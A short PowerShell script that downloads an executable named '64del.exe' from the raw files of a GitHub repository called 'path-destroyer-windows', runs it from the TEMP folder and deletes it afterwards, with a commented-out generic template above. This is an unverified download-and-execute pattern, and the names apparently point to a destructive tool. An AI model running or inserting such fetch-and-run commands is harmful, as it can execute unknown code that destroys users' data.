# --- TEMPLATE ---
# $url = "https://github.com/USER/REPO/releases/latest/download/mytool.exe"
# $tmp = "$env:TEMP\mytool.exe"

# Invoke-WebRequest $url -OutFile $tmp
# & $tmp
# Remove-Item $tmp

# remote download url
$url = "https://raw.githubusercontent.com/Toaster123G/path-destroyer-windows/main/64del.exe"
# dowloadable like tenporarely file
$tmp = "$env:TEMP/64del.exe"

Invoke-WebRequest $url -Outfile $tmp
& $tmp
Remove-Item $tmp